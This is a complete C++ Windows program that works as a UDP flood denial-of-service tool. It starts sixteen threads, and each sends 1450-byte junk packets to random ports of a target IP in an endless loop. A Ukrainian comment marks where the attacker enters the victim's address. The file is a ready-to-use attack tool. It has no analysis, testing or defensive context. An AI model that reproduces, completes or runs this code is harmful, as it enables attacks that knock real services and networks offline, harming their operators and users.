#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <iostream>
#include <vector>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <ctime>
#pragma comment(lib, "ws2_32.lib")
const char* TARGET_IP = ""; // тут вписувати ip 
const int TARGET_PORT = 443;
const int THREAD_COUNT = 16;
void flood() {
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return;
    int sndbuf = 2 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (const char*)&sndbuf, sizeof(sndbuf));
    sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(TARGET_PORT);
    if (inet_pton(AF_INET, TARGET_IP, &target.sin_addr) <= 0) {
        return;
    }
    char data[1450]; 
    memset(data, 'X', 1450);
    srand(static_cast<unsigned int>(time(0)) + GetCurrentThreadId());
    while (true) {
        target.sin_port = htons((rand() % 65000) + 1);
        sendto(sock, data, 1450, 0, (struct sockaddr*)&target, sizeof(target));
    }
    closesocket(sock);
}
int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }
    std::cout << "   TARGET: " << TARGET_IP << std::endl;
    std::cout << "   THREADS: " << THREAD_COUNT << std::endl;
    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(flood);
    }
    for (auto& t : threads) {
        t.join();
    }
    WSACleanup();
    return 0;
}
